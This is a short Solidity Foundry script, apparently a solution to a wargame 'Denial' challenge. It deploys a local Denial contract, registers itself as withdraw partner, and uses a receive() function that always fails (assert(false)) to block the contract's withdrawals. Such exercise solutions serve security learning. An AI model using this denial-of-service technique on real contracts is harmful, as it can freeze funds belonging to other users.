// SPDX-License-Identifier: MIT
pragma solidity >=0.8.10;

import "forge-std/Script.sol";
import "../src/Denial.sol";

contract DenialHack is Script {
    Denial public denial;
    bool public result;

    function run() public {
        denial = new Denial();
        address eoa = address(1024);
        vm.deal(eoa, 5 ether);
        vm.deal(address(denial), 1_000 ether);

        // the normal way
        denial.setWithdrawPartner(eoa);
        denial.withdraw();

        // hacking
        denial.setWithdrawPartner(address(this));
        (result, ) = address(denial).call(
            abi.encodeWithSignature("withdraw()")
        );
        console.log(result);
        console.log(denial.contractBalance());
    }

    receive() external payable {
        assert(false);
    }
}
